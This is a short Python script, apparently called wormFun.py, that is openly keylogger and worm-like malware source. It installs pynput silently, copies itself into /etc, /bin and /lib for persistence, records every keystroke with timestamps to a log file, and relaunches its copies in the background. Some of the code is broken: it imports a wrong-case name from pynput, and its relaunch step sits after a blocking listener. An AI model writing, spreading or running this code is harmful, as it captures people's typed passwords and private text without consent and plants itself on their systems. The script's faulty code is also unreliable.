#!/usr/bin/python3
import logging
import os
import pynput 
from time import sleep
from pynput.keyboard import key, Listener
pip = 'pip install pynput >> 65bit.txt'
os.system(pip)
sleep(3)
rm = 'rm -rf 65bit.txt'
os.system(rm)
cp = 'cp wormFun.py /etc'
os.system(cp)
cp = 'cp wormFun.py /bin'
os.system(cp)
cp = 'cp wormFun.py /lib'
os.system(cp)
 
logging.basicConfig(filename=("wormlog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()
        
run = 'python3 /etc/wormFun.py &'
os.system(run)
run = 'python3  /bin/wormFun.py &'
os.system(run)
run = 'python3 /lib/wormFun.py &'
os.system(run)
sleep(1)

